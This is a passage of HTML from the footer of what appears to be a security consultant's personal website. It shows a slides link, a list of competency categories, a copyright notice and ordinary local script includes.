href=/files/slides/20130918-festival-ict-designing-an-hybrid-data-center-infrastructure.pdf title="View slides" target=_blank rel=noreferrer>Designing an Hybrid Data Center Infrastructure</a></li></ul></div></div><div class="d-none d-md-block col-md-4"><div class=footer-head><h4>Competencies</h4></div><div class=footer-slides><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/security-125x100.webp alt="Incident Response"><div class=overlay>Incident Response</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/ciso-125x100.webp alt=Advisor><div class=overlay>Advisor</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/osint-125x100.webp alt="Open Source Intelligence (OSINT)"><div class=overlay>Open Source Intelligence (OSINT)</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/infrastructure-125x100.webp alt="System Integration / Automation"><div class=overlay>System Integration / Automation</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/writeup-125x100.webp alt="Training / Education / Cyber Range"><div class=overlay>Training / Education / Cyber Range</div></div></div><div class=footer-slide-container><div class=footer-slide><img src=/images/categories/personal-security-125x100.webp alt="Personal Security"><div class=overlay>Personal Security</div></div></div></div></div></div></div></div><div class=footer-copyright><div class=container><div class=row><div class="col-md-12 col-sm-12 col-xs-12"><div class=text-center>&copy; Copyright <strong>Andrea Dainese</strong>. All Rights Reserved</div><div class=text-center>Designed by <a href=https://bootstrapmade.com/ title=BootstrapMade target=_blank rel=noreferrer>BootstrapMade</a></div></div></div></div></div></footer><script src=/plugins/jquery/jquery.min.js></script>
<script src=/plugins/bootstrap/js/bootstrap.min.js></script>
<script src=/plugins/fancybox/jquery.fancybox.min.js></script>
<script src=/plugins/goodshare/goodshare.min.js></script>
<script src=/plugins/fuse/fuse.min.js></script>
<script src=/plugins/jquery-mark/jquery.mark.min.js></script>
<script src=/js/main.js></script>
<script src=/js/search.js></script></body></html>